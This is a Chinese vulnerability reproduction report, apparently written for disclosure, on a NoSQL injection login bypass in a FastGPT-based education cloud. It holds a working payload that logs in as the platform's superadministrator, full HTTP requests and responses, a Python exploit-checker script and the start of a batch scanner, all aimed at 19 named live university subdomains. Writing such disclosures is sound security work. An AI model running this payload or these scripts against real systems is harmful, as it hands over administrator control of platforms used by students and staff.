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智学客教育云平台 FastGPT 登录接口 NoSQL 注入认证绕过漏洞</w:t>
        <w:br/>
        <w:t>漏洞复现过程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CVE-2026-40351　｜　报送单位：CNVD　｜　发现/验证人：indifference108</w:t>
        <w:br/>
        <w:t>首验 2026-10-08（19 入口批量验证）　复测与录屏 2026-10-12（漏洞仍可稳定复现）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一、漏洞基本信息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FastGPT 登录接口 NoSQL 注入认证绕过漏洞（CVE-2026-40351）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NoSQL 注入 / 身份认证绕过（CWE-943）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危险等级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高危　CVSS 3.1 评分 9.8（AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H）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影响软件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FastGPT Community Edition &lt; 4.14.9.5（修复于 4.14.9.5）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受影响系统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智学客教育云平台（*.cloud.zxkedu.com）——北京智学客教育科技有限公司运营，为至少 19 所高校提供 AI 教学应用服务，各高校以独立子域入口共用同一套 FastGPT 后端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 URL（示例入口）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https://hsvtc.cloud.zxkedu.com/api/support/user/account/loginByPassword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其他已验证入口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comgxufe、comsxibs、cqysxy、comtjzyjs、comjlzyjx、comhbdwjm、comgzqgzy、gxcme、jwzxdzjsjc、nxzddzsw、ciorwdlyhygl、comcqysxy、comdlys、comgsjzzyjsxy、comlhub 等，共 19 个（完整清单见附件 evidence/入口点清单.md）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验证账号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root（平台初始化超级管理员，登录后身份 memberName=Owner / role=owner / 权限值 4294967295）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二、漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>智学客教育云平台基于开源 FastGPT 构建。其账号密码登录接口 loginByPassword 在服务端将客户端提交的 JSON 请求体直接拼入 MongoDB 查询，且未对 password 字段做运行时类型校验。攻击者将 password 字段由字符串替换为 MongoDB 查询操作符对象（如 {"$ne": ""}），即可使密码比较条件恒真，绕过密码校验，以请求中指定的任意已存在用户名身份登录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>平台初始化账号 root 即团队 Owner（超级管理员）。以 root 注入成功后，服务端返回完整会话令牌与全量权限字段（isOwner=true，权限值 4294967295），攻击者即可完全控制平台：全部高校租户的用户管理、应用编排、知识库、API 密钥等。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三、复现环境</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>攻击侧：任意可访问互联网的 Python 3 环境（requests 库），无需账号、无需登录目标系统；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>目标侧：智学客教育云平台 FastGPT 实例（社区版，版本低于 4.14.9.5），本次复现以 hsvtc.cloud.zxkedu.com 入口为例；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>复现时间：2026-10-08 对 22 个入口批量只读探针（19 个确认可利用），2026-10-12 复测并全程录屏（漏洞仍可稳定复现）。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四、复现步骤（含请求报文与截图）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1：确认漏洞接口与 POC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>漏洞接口为账号密码登录接口。正常业务流程下使用用户名+密码校验身份。以下为只读验证脚本（POC）代码及注入原理说明：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https://&lt;高校子域&gt;.cloud.zxkedu.com/api/support/user/account/loginByPassword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 "&lt;用户名&gt;", "password": "&lt;密码&gt;"}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741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1_POC脚本与注入原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4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8"/>
        </w:rPr>
        <w:t>图 1　只读验证脚本：密码字段注入 MongoDB 操作符 {"$ne": ""} 使密码比较恒真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2：对照组请求（不存在的账号 + 注入 payload）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>先发送对照组请求：使用不存在的用户名 root_not_exist_probe 携带同样注入 payload，服务端返回账号不存在/密码错误（code=503002, statusText=account_psw_error），证明注入未生效时系统行为正常：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https://hsvtc.cloud.zxkedu.com/api/support/user/account/loginByPassword HTTP/1.1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Host: hsvtc.cloud.zxkedu.com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{"username":"root_not_exist_probe","password":{"$ne":""}}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HTTP/1.1 500 Internal Server Error</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Type: application/json; charset=utf-8</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Server: nginx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"code": 503002,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "statusText": "account_psw_error",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "message": "common:code_error.account_error",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "data": null</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>}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3：实验组请求（root + 注入 payload）—— 漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>将用户名替换为平台超级管理员 root，密码字段注入 {"$ne": ""}。服务端校验被绕过，返回 HTTP 200 与完整会话令牌，登录身份 memberName=Owner、role=owner（权限值 4294967295，全量权限）：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https://hsvtc.cloud.zxkedu.com/api/support/user/account/loginByPassword HTTP/1.1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Host: hsvtc.cloud.zxkedu.com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{"username":"root","password":{"$ne":""}}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HTTP/1.1 200 OK</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Type: application/json; charset=utf-8</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Server: nginx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"code": 200,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  "data": {</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    "user": {</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      "username": "root",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      "team": { "teamName": "My Team", "memberName": "Owner",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                 "role": "owner", "status": "active" },</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      "permission": { "isOwner": true, "value": 4294967295,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                      "hasManagePer": true, "hasWritePer": true, "hasReadPer": true }</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    "token": "687ef902e847352f8785...[令牌已脱敏]"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>对目标入口执行验证脚本（以 hsvtc.cloud.zxkedu.com 为例）：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741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2_对目标入口执行验证脚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4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8"/>
        </w:rPr>
        <w:t>图 2　执行 python demo_record_40351.py https://hsvtc.cloud.zxkedu.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>脚本实际运行输出：对照组返回 503002，实验组返回 HTTP 200 / code=200，判定 vulnerable=TRUE，登录身份 username=root、memberName=Owner、role=owner：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741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3_注入成功判定root_Owner登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4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8"/>
        </w:rPr>
        <w:t>图 3　判定结果：vulnerable=TRUE，任意互联网用户可绕过密码以平台管理员（root/Owner）身份登录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4：同一后端多入口批量验证（影响面确认）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>对 *.cloud.zxkedu.com 子域进行批量只读探针：清洗后 22 个高校入口中 19 个确认可利用（另 2 个当时限流 429，属同一后端）。关键证据——不同高校子域以 root 登录返回的用户 _id 完全相同（687ef902e847352f8785b17e），证明所有入口解析至同一套 FastGPT 后端、共用同一超级管理员账号：一次利用即可同时接管全部 19 所高校面向师生服务的 AI 平台。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入口子域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归属（示例）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验证结果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hsvtc.cloud.zxkedu.com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黄山职业技术学院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✅ 可利用，root 登录成功（本复现示例入口）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comgxufe.cloud.zxkedu.com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广西财经学院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✅ 可利用，root _id 与 hsvtc 完全相同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comsxibs.cloud.zxkedu.com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山西工商学院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✅ 可利用，root _id 与 hsvtc 完全相同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cqysxy.cloud.zxkedu.com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重庆移通学院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✅ 可利用，root _id 与 hsvtc 完全相同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comtjzyjs.cloud.zxkedu.com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天津职业大学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✅ 可利用，root _id 与 hsvtc 完全相同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gxcme.cloud.zxkedu.com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广西机电职业技术学院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✅ 可利用，root _id 与 hsvtc 完全相同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其余 13 个入口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见入口点清单.md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8"/>
              </w:rPr>
              <w:t>✅ 可利用（共 19 个），2 个当时限流 429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五、漏洞验证脚本（POC）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>以下 POC 为只读验证脚本：每个目标仅发送 2 次登录请求（对照组+实验组），不修改任何数据，令牌本体不落盘。单目标验证运行方式：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python check_cve_2026_40351.py https://hsvtc.cloud.zxkedu.com</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 输出 "vulnerable": true 即定案</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 批量探针（19 入口确认所用）: python batch_scan_zxkedu.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>单目标验证脚本 check_cve_2026_40351.py：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#!/usr/bin/env python3</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># -*- coding: utf-8 -*-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CVE-2026-40351 FastGPT 登录接口 NoSQL 注入 - 只读验证脚本</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>影响版本: FastGPT Community Edition &lt; 4.14.9.5 (修复于 4.14.9.5)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>漏洞接口: POST /api/support/user/account/loginByPassword</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>原理: 密码字段未做运行时类型校验,MongoDB 查询直接拼接用户输入,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      注入 {"$ne": ""} 使密码比较恒真,绕过密码校验以任意存在用户身份登录,</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      典型利用: 以 root(平台管理员) 身份登录,拿到平台全部控制权。</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>本脚本每个目标仅发 1-2 次登录请求,不修改任何数据;token 不保存不落盘。</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>用法: python check_cve_2026_40351.py &lt;target&gt; [--user root]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import argparse</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import json</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import sys</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>import urllib3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import requests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urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)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PAYLOAD_TEMPLATE = {"username": "{user}", "password": {"$ne": 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check(target: str, user: str = "root", proxy: str | None = None, timeout: int = 20) -&gt; dict:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = target.rstrip("/") + "/api/support/user/account/loginByPassword"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    proxies = {"http": proxy, "https": proxy} if proxy else None</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    result = {"target": target, "username": user}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对照组: 不存在账号 + 注入 payload,区分"账号不存在"与"密码错误"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    ctrl = dict(PAYLOAD_TEMPLATE)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    ctrl["username"] = user + "_not_exist_probe"</w:t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r = requests.post(url, json=ctrl, timeout=timeout, verify=False, proxies=proxies)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        d = r.json()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["ctrl_code"] = d.get("code")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["ctrl_statusText"] = d.get("statusText")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["error"] = f"ctrl request failed: {e}"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r = requests.post(url, json=dict(PAYLOAD_TEMPLATE, username=user),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                          timeout=timeout, verify=False, proxies=proxies)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    except requests.RequestException as e:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["error"] = str(e)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result["http_status"] = r.status_code</w:t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data = r.json()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    except ValueError:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["error"] = "non-json response"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result["code"] = data.get("code")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    result["statusText"] = data.get("statusText")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = data.get("data") or {}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    if data.get("code") == 200 and isinstance(d, dict) and d.get("token") and d.get("user"):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        u = d["user"]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["vulnerable"] = True</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["login_user"] = {k: u.get(k) for k in ("username", "email", "role", "createTime") if k in u}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["token_len"] = len(d["token"])  # token 本体不落盘</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(d.get("team"), dict):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            result["team"] = {k: d["team"].get(k) for k in ("name", "role") if k in d["team"]}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        result["vulnerable"] = False</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">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main():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    p = argparse.ArgumentParser(description="CVE-2026-40351 FastGPT login NoSQLi checker")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    p.add_argument("target", help="目标根地址")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    p.add_argument("--user", default="root", help="尝试登录的用户名,默认 root")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    p.add_argument("--proxy", help="代理,例如 http://127.0.0.1:7897")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = p.parse_args()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(json.dumps(check(args.target, args.user, proxy=args.proxy), ensure_ascii=False, indent=2))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if __name__ == "__main__":</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    main()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>批量探针脚本 batch_scan_zxkedu.py（仅发送只读登录验证请求）：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import warnings, requests, json, time</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>warnings.filterwarnings('ignore')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hosts = sorted(json.load(open('fofa_pool/zxk_clean.json', encoding='utf-8')).keys())</w:t>
        <w:br/>
